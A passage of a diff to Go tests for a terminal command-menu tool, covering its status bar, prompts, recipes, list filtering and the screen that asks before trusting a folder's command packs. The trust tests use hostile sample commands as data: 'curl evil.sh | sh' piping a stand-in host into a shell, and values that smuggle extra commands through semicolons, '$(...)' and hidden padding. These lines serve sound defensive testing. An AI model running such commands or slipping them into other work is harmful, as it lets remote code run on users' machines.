+
+	keys := "→ go · / filter · [ ] jump · esc quit · r recipe · tab shell"
+	m.news = &Headline{Kind: Attention, Text: "↑ Update clingon"}
+	barIs("news that needs acting on wins", "↑ Update clingon")
+	m.news = &Headline{Kind: Info, Text: "• Add 5 packs"}
+	barIs("a suggestion doesn't", keys)
+	m.news = &Headline{Kind: Good, Text: "✓ All set"}
+	barIs("nor all's well", keys)
+	m.news = nil
+
+	m.showSection(&m.opt.Config.Sections[0])
+	barIs("section", "→ go · ← back · / filter · [ ] jump · 1-9 add · r recipe · tab shell")
+
+	m.Update(typed("/"))
+	barIs("filtering", "→ go · ← back · / stop filtering · esc clear filter · [ ] jump · tab shell")
+	footIs("filtering", "")
+	m.Update(typed("/"))
+
+	m.Update(tea.BlurMsg{})
+	barIs("in the shell", "shift-tab menu")
+	m.Update(tea.FocusMsg{})
+
+	// A prompt's keys stay in the menu, by the question.
+	for i, it := range m.list.view {
+		if it.title == "r" {
+			m.list.cursor = i
+		}
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	if m.mode != modeConfirm {
+		t.Fatalf("mode %v", m.mode)
+	}
+	barIs("a prompt", "")
+	footIs("a prompt", "↑↓ choose · enter select")
+	answer(m, false)
+
+	// The notch stays through anything else the bar has to say.
+	m.errMsg = "✗ it broke"
+	barIs("an error", "✗ it broke")
+	m.errMsg = ""
+
+	// Numbering a step: the recipe takes the bar, and ? help is still there.
+	m.Update(typed("1"))
+	if bar := ansi.Strip(m.statusBar(120)); !strings.HasPrefix(bar, " ? help ") || !strings.Contains(bar, "recipe") || strings.Contains(bar, "/ filter") {
+		t.Errorf("bar %q", bar)
+	}
+	footIs("with a recipe", "")
+
+	// In print mode there's no shell pane to go to, and no recipes.
+	p := New(Options{Config: &config.Config{Sections: sections}})
+	p.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	if bar := strings.TrimSpace(ansi.Strip(p.statusBar(120))); bar != "? help  → go · / filter · [ ] jump · esc quit" {
+		t.Errorf("print mode: bar %q", bar)
 	}
 }
 
@@ -1421,7 +1744,7 @@ func TestDangerMeansTypingACode(t *testing.T) {
 	if !m.pending.typed || m.yes {
 		t.Fatal("typed right: now No/Yes, with No first")
 	}
-	m.Update(typed("y"))
+	answer(m, true)
 	if len(sent) != 1 || sent[0] != "dropdb prod" {
 		t.Fatalf("got %v", sent)
 	}
@@ -1477,12 +1800,22 @@ func TestSecretsNeverReachTheScreenOrHistory(t *testing.T) {
 	}
 }
 
+// writeProject gives a repository a project pack called Deploy, with one submenu.
+func writeProject(t *testing.T, repo, module string) {
+	t.Helper()
+	dir := filepath.Join(repo, config.ProjectDir, "deploy")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "prod.yaml"), []byte(module), 0o644); err != nil {
+		t.Fatal(err)
+	}
+}
+
 func TestProjectPacksAskFirst(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
 	repo := t.TempDir()
-	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte("sections:\n  - name: Deploy\n    groups:\n      - name: Prod\n        commands:\n          - name: Ship it\n            cmd: ./ship.sh\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
+	writeProject(t, repo, "name: Prod\ncommands:\n  - name: Ship it\n    cmd: ./ship.sh\n")
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Status", Cmd: "git status"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
 	m.Update(tea.WindowSizeMsg{Width: 80, Height: 40})
@@ -1494,14 +1827,12 @@ func TestProjectPacksAskFirst(t *testing.T) {
 	if m.mode != modeTrust || !strings.Contains(ansi.Strip(m.view()), "./ship.sh") {
 		t.Fatal("the trust screen should show what it would run")
 	}
-	m.Update(typed("y"))
+	answer(m, true)
 	if it := m.list.selected(); it == nil || it.title != "Deploy" {
 		t.Fatalf("trusted: its sections show, got %+v", it)
 	}
 	// Editing the file means asking again.
-	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte("sections:\n  - name: Deploy\n    groups:\n      - name: Prod\n        commands:\n          - name: Ship it\n            cmd: curl evil.sh | sh\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
+	writeProject(t, repo, "name: Prod\ncommands:\n  - name: Ship it\n    cmd: curl evil.sh | sh\n")
 	m.showRoot("")
 	if m.list.selected().title != "Use this folder's commands?" || !m.project.Changed {
 		t.Fatal("a changed file should be untrusted again")
@@ -1513,14 +1844,12 @@ func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
 	repo := t.TempDir()
 	long := "ls " + strings.Repeat("padding ", 30) + "; curl evil | sh"
 	var b strings.Builder
-	b.WriteString("sections:\n  - name: Deploy\n    commands:\n")
+	b.WriteString("commands:\n")
 	for i := 0; i < 40; i++ {
-		fmt.Fprintf(&b, "      - name: C%d\n        cmd: echo command-%d\n", i, i)
+		fmt.Fprintf(&b, "  - name: C%d\n    cmd: echo command-%d\n", i, i)
 	}
-	fmt.Fprintf(&b, "      - name: Long\n        cmd: %s\n", long)
-	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(b.String()), 0o644); err != nil {
-		t.Fatal(err)
-	}
+	fmt.Fprintf(&b, "  - name: Long\n    cmd: %s\n", long)
+	writeProject(t, repo, b.String())
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
 	m.Update(tea.WindowSizeMsg{Width: 60, Height: 24})
@@ -1531,9 +1860,10 @@ func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
 	if !strings.Contains(view, "more to read") {
 		t.Fatalf("it should say there's more:\n%s", view)
 	}
-	m.Update(typed("y"))
-	if m.mode != modeTrust {
-		t.Fatal("yes shouldn't work before the end")
+	seen += view
+	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
+	if m.yes {
+		t.Fatal("Yes shouldn't open before the end")
 	}
 	for i := 0; i < 300 && m.trustTop < m.trustMax; i++ {
 		seen += ansi.Strip(m.view())
@@ -1552,7 +1882,7 @@ func TestTrustScreenShowsEveryCommandBeforeYes(t *testing.T) {
 	if !strings.Contains(ansi.Strip(m.view()), "Yes, use them") {
 		t.Errorf("the choices should stay on screen:\n%s", m.view())
 	}
-	m.Update(typed("y"))
+	answer(m, true)
 	if m.mode == modeTrust {
 		t.Fatal("at the end, yes works")
 	}
@@ -1562,11 +1892,9 @@ func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
 	repo := t.TempDir()
 	tabs := strings.Repeat(`\\t`, 33)
-	pack := "sections:\n  - name: S\n    commands:\n      - name: Run\n        cmd: \"npm test" + tabs + ";touch HIDDEN\"\n" +
-		"      - name: Wide\n        cmd: \"ls \\u1160\\u1160;touch WIDE\"\n"
-	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(pack), 0o644); err != nil {
-		t.Fatal(err)
-	}
+	pack := "commands:\n  - name: Run\n    cmd: \"npm test" + tabs + ";touch HIDDEN\"\n" +
+		"  - name: Wide\n    cmd: \"ls \\u1160\\u1160;touch WIDE\"\n"
+	writeProject(t, repo, pack)
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
 	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
@@ -1587,33 +1915,29 @@ func TestTrustScreenSpellsOutWhatWouldTakeNoRoom(t *testing.T) {
 func TestTrustScreenShowsOptionsDefaultsAndJoins(t *testing.T) {
 	t.Setenv("CLINGON_CONFIG", t.TempDir())
 	repo := t.TempDir()
-	pack := `sections:
-  - name: S
-    commands:
-      - name: D
-        cmd: echo <env>
-        args:
-          - name: env
-            options:
-              - { value: 'staging;touch OPT', label: staging }
-      - name: H
-        cmd: echo <who>
-        args:
-          - { name: who, default: '$(touch DEF)' }
-      - name: J
-        cmd: echo <x>
-        args:
-          - name: x
-            type: flags
-            join: ';touch JOIN;'
-            options: [a, b]
+	pack := `commands:
+  - name: D
+    cmd: echo <env>
+    args:
+      - name: env
+        options:
+          - { value: 'staging;touch OPT', label: staging }
+  - name: H
+    cmd: echo <who>
+    args:
+      - { name: who, default: '$(touch DEF)' }
+  - name: J
+    cmd: echo <x>
+    args:
+      - name: x
+        type: flags
+        join: ';touch JOIN;'
+        options: [a, b]
 `
-	if err := os.WriteFile(filepath.Join(repo, config.ProjectFile), []byte(pack), 0o644); err != nil {
-		t.Fatal(err)
-	}
+	writeProject(t, repo, pack)
 	cfg := &config.Config{Sections: []config.Section{{Name: "Git", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "Log", Cmd: "git log"}}}}}
 	m := New(Options{Config: cfg, Dir: func() string { return repo }, Project: config.FindProject})
-	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 48})
 	m.showRoot("")
 	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
 	view := ansi.Strip(m.view())
@@ -1698,9 +2022,10 @@ func TestScrolledGroupKeepsItsHeading(t *testing.T) {
 	}
 }
 
-func TestQuittingWithJobsAsksFirst(t *testing.T) {
+func TestQuittingAsksFirst(t *testing.T) {
 	jobs := []string{"sleep"}
-	m := New(Options{Config: &config.Config{}, Jobs: func() []string { return jobs }})
+	send := func(string) error { return nil }
+	m := New(Options{Config: &config.Config{}, Send: send, Jobs: func() []string { return jobs }})
 	esc, enter := tea.KeyPressMsg{Code: tea.KeyEscape}, tea.KeyPressMsg{Code: tea.KeyEnter}
 	m.Update(esc)
 	if m.mode != modeQuit || m.Quit {
@@ -1724,10 +2049,24 @@ func TestQuittingWithJobsAsksFirst(t *testing.T) {
 		t.Fatal("yes quits")
 	}
 
+	// With nothing running it still asks, and goes back to asking plainly.
 	jobs = nil
-	m = New(Options{Config: &config.Config{}, Jobs: func() []string { return jobs }})
-	if m.Update(esc); !m.Quit {
-		t.Fatal("with nothing running, esc quits straight away")
+	m = New(Options{Config: &config.Config{}, Send: send, Jobs: func() []string { return jobs }})
+	if m.Update(esc); m.mode != modeQuit || m.Quit {
+		t.Fatalf("it should ask, got mode %v quit %v", m.mode, m.Quit)
+	}
+	if got := ansi.Strip(m.quitView(60)); !strings.Contains(got, "Quit clingon?") || strings.Contains(got, "Still running") {
+		t.Errorf("view %q", got)
+	}
+	m.Update(esc)
+	if m.mode != modeBrowse || m.Quit {
+		t.Fatal("a second esc goes back: a double-tap never quits")
+	}
+
+	// Print mode has no shell to close, so there's nothing to ask.
+	p := New(Options{Config: &config.Config{}})
+	if p.Update(esc); !p.Quit {
+		t.Fatal("in print mode, esc quits straight away")
 	}
 }
 
@@ -1754,14 +2093,14 @@ func TestStartingShellLocksQuietly(t *testing.T) {
 	if m.blocked() == "" {
 		t.Error("the menu should still hold commands back")
 	}
-	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "is running") {
+	if bar := ansi.Strip(m.barBody(60)); strings.Contains(bar, "is running") {
 		t.Errorf("the band should wait for the first prompt, got %q", bar)
 	}
 	st = ShellState{}
 	m.readShell()
 	st = ShellState{Busy: "sleep"}
 	m.readShell()
-	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "sleep is running") {
+	if bar := ansi.Strip(m.barBody(60)); !strings.Contains(bar, "sleep is running") {
 		t.Errorf("after the first prompt the band should say so, got %q", bar)
 	}
 }
@@ -1808,7 +2147,7 @@ func TestLeavingAndComingBackOnEveryScreen(t *testing.T) {
 				if m.mode != c.mode || m.Quit {
 					t.Errorf("coming back moved on: mode %d, quit %v", m.mode, m.Quit)
 				}
-				for _, in := range m.inputs() {
+				for _, in := range m.shownInputs() {
 					if !in.Focused() {
 						t.Error("an input on screen is still blurred")
 					}
@@ -1822,11 +2161,11 @@ func TestSavingARecipe(t *testing.T) {
 	cmds := []config.Command{{Name: "one", Cmd: "one"}, {Name: "two", ID: "s-22222222", Cmd: "two"}}
 	var sent []string
 	var saved []config.Recipe
-	failed := false
+	failed, known := false, true
 	m := New(Options{
 		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
 		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
-		LastFailed: func() bool { return failed }, Shell: func() ShellState { return ShellState{} },
+		LastFailed: func() (bool, bool) { return failed, known }, Shell: func() ShellState { return ShellState{} },
 		Recipes: func() []config.Recipe { return saved }, Self: "clingon",
 		Builtin: func() []*config.Section {
 			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
@@ -1905,7 +2244,7 @@ func TestSavingARecipe(t *testing.T) {
 	// A name that's taken is refused there and then.
 	saved = []config.Recipe{{Name: "My Flow", Steps: []string{"x-00000000"}}}
 	right()
-	m.Update(typed("y"))
+	answer(m, true)
 	m.Update(typed("my flow"))
 	right()
 	if m.mode != modeSaveName || !strings.Contains(m.view(), "already have") {
@@ -2020,7 +2359,7 @@ func TestSavingARecipe(t *testing.T) {
 		t.Errorf("No: sent %v, mode %v, at %+v", sent, m.mode, it)
 	}
 	right()
-	m.Update(typed("y"))
+	answer(m, true)
 	sentIs("clingon recipe remove 'My flow'")
 
 	// If it fails it's still there, and so are you.
@@ -2031,7 +2370,7 @@ func TestSavingARecipe(t *testing.T) {
 
 	// When it's gone, you're back in All recipes, on the next one.
 	right()
-	m.Update(typed("y"))
+	answer(m, true)
 	saved = slices.Delete(saved, 1, 2)
 	idle()
 	if it := m.list.selected(); m.opened != "" || it.title != "Z" {
@@ -2062,11 +2401,912 @@ func TestSavingARecipe(t *testing.T) {
 	m.errMsg = ""
 	on("Run recipe")
 	right()
-	m.Update(typed("y"))
+	answer(m, true)
 	m.Update(typed("Again"))
 	right()
 	done()
 	if len(sent) != 1 || m.run != nil || !strings.Contains(m.errMsg, "not saved") || len(m.recipe) != 2 {
 		t.Errorf("sent %v, run %+v, err %q, recipe %d steps", sent, m.run, m.errMsg, len(m.recipe))
+	}
+}
+
+func TestRunningARecipeFromAPosition(t *testing.T) {
+	cmds := []config.Command{
+		{Name: "bad", Cmd: "bad"},
+		{Name: "one", Cmd: "one"},
+		{Name: "risky", Cmd: "risky", Risk: config.RiskWarn},
+		{Name: "two", Cmd: "two"},
+	}
+	var sent []string
+	failed, known := false, true
+	m := New(Options{
+		Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: cmds}}},
+		Send:   func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true },
+		LastFailed: func() (bool, bool) { return failed, known }, Shell: func() ShellState { return ShellState{} },
+		Builtin: func() []*config.Section {
+			return []*config.Section{{Name: RecipesSection, Icon: "•", Category: "Clingon", Groups: []config.Group{{Name: "Current recipe"}}}}
+		}})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	on := func(name string) {
+		t.Helper()
+		for i, it := range m.list.view {
+			if it.title == name {
+				m.list.cursor = i
+				return
+			}
+		}
+		t.Fatalf("no row %q", name)
+	}
+	right := func() { t.Helper(); m.Update(tea.KeyPressMsg{Code: tea.KeyRight}) }
+	done := func() { t.Helper(); m.Update(idleMsg{seq: m.run.seq, ok: true}) }
+	sentIs := func(want string) {
+		t.Helper()
+		if got := strings.Join(sent, " "); got != want {
+			t.Errorf("sent %q, want %q", got, want)
+		}
+	}
+	build := func(names ...string) {
+		t.Helper()
+		m.Update(typed("x"))
+		m.showSection(&m.opt.Config.Sections[0])
+		for i, name := range names {
+			on(name)
+			m.Update(typed(fmt.Sprint(i + 1)))
+		}
+		m.Update(typed("r"))
+		sent, m.errMsg, m.hint = nil, "", ""
+		failed, known = false, true
+	}
+	cursorOn := func() string { return m.list.view[m.list.cursor].title }
+
+	// Only Run recipe and the commands: no rows of their own for carrying on.
+	build("one", "bad", "two")
+	if cursorOn() != "Run recipe" {
+		t.Fatalf("cursor on %q", cursorOn())
+	}
+	for _, it := range m.list.view {
+		if strings.Contains(it.title, "Retry") || strings.Contains(it.title, "Skip") {
+			t.Errorf("row %q", it.title)
+		}
+	}
+
+	// A command's row runs the recipe from there, and says so.
+	on("bad")
+	if _, desc := m.details(); !strings.Contains(desc, "from here, command 2 of 3") {
+		t.Errorf("desc %q", desc)
+	}
+	right()
+	sentIs("bad")
+	done()
+	sentIs("bad two")
+	done()
+	if m.run != nil || !strings.Contains(m.hint, "finished") {
+		t.Errorf("run %+v, hint %q", m.run, m.hint)
+	}
+
+	// The last one runs alone.
+	build("one", "bad", "two")
+	on("two")
+	right()
+	sentIs("two")
+	done()
+	if m.run != nil {
+		t.Errorf("run %+v", m.run)
+	}
+
+	// A failure leaves the cursor on what stopped it: enter retries from there.
+	build("one", "bad", "two")
+	on("Run recipe")
+	right()
+	sentIs("one")
+	done()
+	failed = true
+	done()
+	failed = false
+	if m.run != nil || cursorOn() != "bad" || !strings.Contains(m.errMsg, "command 2") {
+		t.Fatalf("run %+v, cursor on %q, err %q", m.run, cursorOn(), m.errMsg)
+	}
+	sent = nil
+	right()
+	sentIs("bad")
+	failed = true
+	done() // it can fail again, and stop in the same place
+	failed = false
+	if m.run != nil || cursorOn() != "bad" {
+		t.Fatalf("run %+v, cursor on %q", m.run, cursorOn())
+	}
+	// ...and the next row skips it.
+	sent = nil
+	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
+	right()
+	sentIs("two")
+	done()
+
+	// Going away and coming back still lands there; a changed recipe doesn't.
+	build("one", "bad", "two")
+	on("bad")
+	right()
+	failed = true
+	done()
+	failed = false
+	m.showSection(&m.opt.Config.Sections[0])
+	m.Update(typed("r"))
+	if cursorOn() != "bad" {
+		t.Errorf("cursor on %q", cursorOn())
+	}
+	m.showSection(&m.opt.Config.Sections[0])
+	on("risky")
+	m.Update(typed("4"))
+	m.Update(typed("r"))
+	if cursorOn() != "Run recipe" {
+		t.Errorf("a changed recipe starts at the top: cursor on %q", cursorOn())
+	}
+
+	// Run recipe still starts from the top, and a risky command still asks.
+	build("one", "risky", "two")
+	on("risky")
+	right()
+	if m.mode != modeConfirm || len(sent) != 0 {
+		t.Fatalf("mode %v, sent %v", m.mode, sent)
+	}
+	answer(m, false)
+	if m.run != nil || cursorOn() != "risky" {
+		t.Fatalf("No stops it there: run %+v, cursor on %q", m.run, cursorOn())
+	}
+	on("Run recipe")
+	right()
+	sentIs("one")
+	m.Update(typed("x"))
+
+	// A result that can't be read stops it too.
+	build("one", "bad")
+	on("Run recipe")
+	right()
+	known = false
+	done()
+	known = true
+	if m.run != nil || !strings.Contains(m.errMsg, "couldn't tell if it worked") || cursorOn() != "one" {
+		t.Errorf("run %+v, err %q, cursor on %q", m.run, m.errMsg, cursorOn())
+	}
+}
+
+// answer picks No or Yes on a prompt the way you do: move to it, press enter.
+func answer(m *Model, yes bool) {
+	for i := 0; i < 200 && m.yes != yes; i++ {
+		m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
+}
+
+// No prompt takes a letter for an answer: y and n aren't keys.
+func TestPromptsIgnoreYAndN(t *testing.T) {
+	for _, mode := range []mode{modeQuit, modeSave, modeTyped, modeConfirm, modeTrust} {
+		for _, k := range []string{"y", "Y", "n", "N"} {
+			var sent []string
+			m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}}}},
+				Send: func(c string) error { sent = append(sent, c); return nil }})
+			m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+			m.showSection(&m.opt.Config.Sections[0])
+			m.mode = mode
+			m.pending = &pending{sec: m.section, section: "S", name: "a", cmd: "a", shown: "a", risk: config.RiskWarn}
+			m.recipe = []recipeStep{{"a", cmdRef{"S", m.section, &m.opt.Config.Sections[0].Commands[0]}}}
+			m.trustMax = 0 // Yes is open
+			m.Update(typed(k))
+			if m.mode != mode || m.Quit || len(sent) != 0 || m.run != nil {
+				t.Errorf("mode %v, key %q: now mode %v, quit %v, sent %v, run %+v", mode, k, m.mode, m.Quit, sent, m.run)
+			}
+		}
+	}
+}
+
+// With the bar in its own pane, browsing leaves nothing under the info pane:
+// no keys and no rule, and the view still fills the menu's pane exactly. A
+// prompt keeps its keys, under the rule.
+func TestBrowsingHasNoFooter(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "r", Cmd: "r", Risk: config.RiskWarn}}}}},
+		Send: func(string) error { return nil }, Bar: func(string) {}, BarWidth: func() int { return 80 }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	lines := func() []string { return strings.Split(ansi.Strip(m.view()), "\n") }
+	got := lines()
+	if len(got) != 40 {
+		t.Errorf("view is %d lines, want 40", len(got))
+	}
+	last := strings.TrimSpace(got[len(got)-1])
+	if strings.Contains(last, "help") || strings.HasPrefix(last, "─") {
+		t.Errorf("nothing should be under the info pane: %q", last)
+	}
+	if strings.Contains(strings.Join(got, "\n"), "? help") {
+		t.Error("? help belongs to the bar's notch")
+	}
+	for i, it := range m.list.view {
+		if it.title == "r" {
+			m.list.cursor = i
+		}
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	got = lines()
+	if len(got) != 40 || strings.TrimSpace(got[len(got)-1]) != "↑↓ choose · enter select" || !strings.HasPrefix(got[len(got)-2], "─") {
+		t.Errorf("a prompt keeps its keys under the rule: %d lines, ending %q", len(got), got[len(got)-2:])
+	}
+}
+
+// Every list filters the same way: / opens it, it's the first line, and nothing
+// else types into it.
+func TestEveryListFiltersTheSameWay(t *testing.T) {
+	sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "pick", Cmd: "pick <x>", Desc: "Picks <x>.", Args: []config.Arg{{Name: "x", Options: []config.Option{
+			{Value: "apple", Label: "A fruit"}, {Value: "apple/core", Label: "The middle", Indent: true}, {Value: "banana", Label: "Also a fruit"},
+		}}}},
+		{Name: "multi", Cmd: "multi <y>", Args: []config.Arg{{Name: "y", Type: "flags", Options: []config.Option{{Value: "-a"}, {Value: "-b"}}}}},
+	}}
+	var sent []string
+	m := New(Options{Config: &config.Config{Sections: []config.Section{sec}}, Send: func(c string) error { sent = append(sent, c); return nil }, WaitIdle: func() bool { return true }, Shell: func() ShellState { return ShellState{} }})
+	m.Update(tea.WindowSizeMsg{Width: 70, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	key := func(c rune) { m.Update(tea.KeyPressMsg{Code: c}) }
+	open := func(name string) {
+		t.Helper()
+		m.Update(tea.KeyPressMsg{Code: tea.KeyEscape})
+		m.mode, m.job = modeBrowse, nil
+		m.showSection(&m.opt.Config.Sections[0])
+		for i, it := range m.list.view {
+			if it.title == name {
+				m.list.cursor = i
+			}
+		}
+		key(tea.KeyRight)
+		if m.job == nil || !m.job.usePick {
+			t.Fatalf("%s should ask with a list", name)
+		}
+	}
+	// The filter's line, under the header's two lines and the path.
+	filterRow := func() string {
+		t.Helper()
+		lines := strings.Split(ansi.Strip(m.view()), "\n")
+		for i, l := range lines {
+			if strings.HasPrefix(l, "❯") {
+				return fmt.Sprintf("%d %s", i, strings.TrimSpace(l))
+			}
+		}
+		t.Fatalf("no filter line:\n%s", strings.Join(lines, "\n"))
+		return ""
+	}
+	browse := filterRow()
+	if !strings.HasSuffix(browse, "❯ / to filter") {
+		t.Fatalf("browse: %q", browse)
+	}
+	open("pick")
+	if got := filterRow(); got != browse {
+		t.Errorf("the filter should be in the same place: %q, and in the menu %q", got, browse)
+	}
+	// Typing does nothing but say what does.
+	m.Update(typed("b"))
+	if m.job.pick.filtering || m.job.pick.query() != "" || !strings.Contains(m.hint, "Press / to filter") {
+		t.Errorf("filtering %v, query %q, hint %q", m.job.pick.filtering, m.job.pick.query(), m.hint)
+	}
+	if m.job.pick.selected().title != "apple" {
+		t.Errorf("selected %q", m.job.pick.selected().title)
+	}
+	// It's said until the next key, in a list as in the menu.
+	key(tea.KeyDown)
+	if m.hint != "" {
+		t.Errorf("hint %q", m.hint)
+	}
+	key(tea.KeyUp)
+
+	// The parts are indented; the description says what's highlighted.
+	if view := ansi.Strip(m.view()); !strings.Contains(view, "    apple/core") || !strings.Contains(view, "Picks apple. A fruit.") {
+		t.Errorf("view:\n%s", view)
+	}
+	key(tea.KeyDown)
+	if view := strings.Join(strings.Fields(ansi.Strip(m.view())), " "); !strings.Contains(view, "Picks apple/core. The middle.") {
+		t.Errorf("view:\n%s", view)
+	}
+	key(tea.KeyUp)
+
+	// / opens it, and the footer says how to stop.
+	m.Update(typed("/"))
+	if !m.job.pick.filtering || !strings.Contains(ansi.Strip(m.footer(70)), "/ stop filtering") {
+		t.Fatalf("filtering %v, footer %q", m.job.pick.filtering, ansi.Strip(m.footer(70)))
+	}
+	m.Update(typed("b"))
+	if m.job.pick.selected().title != "banana" {
+		t.Errorf("selected %q", m.job.pick.selected().title)
+	}
+	// / again closes it and keeps it, without leaving the command.
+	m.Update(typed("/"))
+	if m.job == nil || m.job.pick.filtering || m.job.pick.query() != "b" {
+		t.Error("/ should close the filter and keep it")
+	}
+	key(tea.KeyEscape)
+	m.Update(typed("/b"))
+	if !m.job.pick.filtering || m.job.pick.query() != "b" {
+		t.Errorf("fast typing: query %q", m.job.pick.query())
+	}
+	key(tea.KeyEscape)
+	if m.mode != modeFill || m.job.pick.filtering {
+		t.Errorf("esc should close the filter first: mode %v", m.mode)
+	}
+	m.Update(typed("/"))
+	m.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})
+	if m.mode != modeFill || m.job.pick.filtering {
+		t.Errorf("ctrl-c should close the filter first: mode %v", m.mode)
+	}
+	m.Update(tea.KeyPressMsg{Code: 'c', Mod: tea.ModCtrl})
+	if m.mode != modeBrowse {
+		t.Errorf("and then the command: mode %v", m.mode)
+	}
+
+	// A checklist still ticks with space, filter open or not, and says nothing.
+	open("multi")
+	key(tea.KeySpace)
+	if m.job.pick.filtering || len(m.job.pick.values()) != 1 || m.hint != "" {
+		t.Errorf("values %v, hint %q", m.job.pick.values(), m.hint)
+	}
+}
+
+// The version sits at the bar's right, in the same chip as help, and makes way
+// when the message needs the room.
+func TestStatusBarShowsTheVersion(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{{Name: "a", Cmd: "a"}}}}}, Version: "v1.2.3"})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	line := m.statusBar(100)
+	if got := ansi.Strip(line); !strings.HasPrefix(got, " ? help ") || !strings.HasSuffix(got, " v1.2.3 ") {
+		t.Errorf("bar %q", got)
+	}
+	if w := ansi.StringWidth(line); w != 100 {
+		t.Errorf("the bar is %d wide", w)
+	}
+	if narrow := ansi.Strip(m.statusBar(45)); strings.Contains(narrow, "v1.2.3") || !strings.HasPrefix(narrow, " ? help ") {
+		t.Errorf("narrow bar %q", narrow)
+	}
+	if got := ansi.StringWidth(m.statusBar(45)); got != 45 {
+		t.Errorf("the narrow bar is %d wide", got)
+	}
+	if strings.Contains(ansi.Strip(m.view()), "v1.2.3\n") && strings.HasPrefix(ansi.Strip(m.view()), "v1.2.3") {
+		t.Error("the version shouldn't be by the logo")
+	}
+	// The way there starts with the category, with no arrow in front of it.
+	m.showSection(&m.opt.Config.Sections[0])
+	view := ansi.Strip(m.view())
+	if strings.Contains(view, "‹") || !strings.Contains(view, "Other ›") {
+		t.Errorf("breadcrumb:\n%s", view)
+	}
+}
+
+// The command's heading says how many blanks it has, while choosing and filling
+// in; one with none doesn't mention it.
+func TestCommandHeadingSaysHowManySteps(t *testing.T) {
+	m := New(Options{Config: &config.Config{Sections: []config.Section{{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{
+		{Name: "a two", Cmd: "x <p> <q>", Args: []config.Arg{{Name: "p"}, {Name: "q"}}},
+		{Name: "b one", Cmd: "y <p>", Args: []config.Arg{{Name: "p"}}},
+		{Name: "c none", Cmd: "z"},
+	}}}}, Send: func(string) error { return nil }})
+	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
+	m.showSection(&m.opt.Config.Sections[0])
+	heading := func() string {
+		t.Helper()
+		for _, l := range strings.Split(ansi.Strip(m.view()), "\n") {
+			if l = strings.TrimSpace(l); l == "COMMAND" || strings.HasPrefix(l, "COMMAND (") {
+				return l
+			}
+		}
+		t.Fatal("no COMMAND heading")
+		return ""
+	}
+	want := map[string]string{"a two": "COMMAND (2 STEPS)", "b one": "COMMAND (1 STEP)", "c none": "COMMAND"}
+	for i, it := range m.list.view {
+		if w, ok := want[it.title]; ok {
+			m.list.cursor = i
+			if got := heading(); got != w {
+				t.Errorf("%s: %q, want %q", it.title, got, w)
+			}
+		}
+	}
+	for i, it := range m.list.view {
+		if it.title == "a two" {
+			m.list.cursor = i
+		}
+	}
+	m.Update(tea.KeyPressMsg{Code: tea.KeyRight})
+	if got := heading(); got != "COMMAND (2 STEPS)" {
+		t.Errorf("filling in: %q", got)
+	}
+}
+
+// A section of clingon's own can sit among the packs, under its category, with
+// the rest of clingon's below the divider.
+func TestCommandLineSitsAmongThePacks(t *testing.T) {
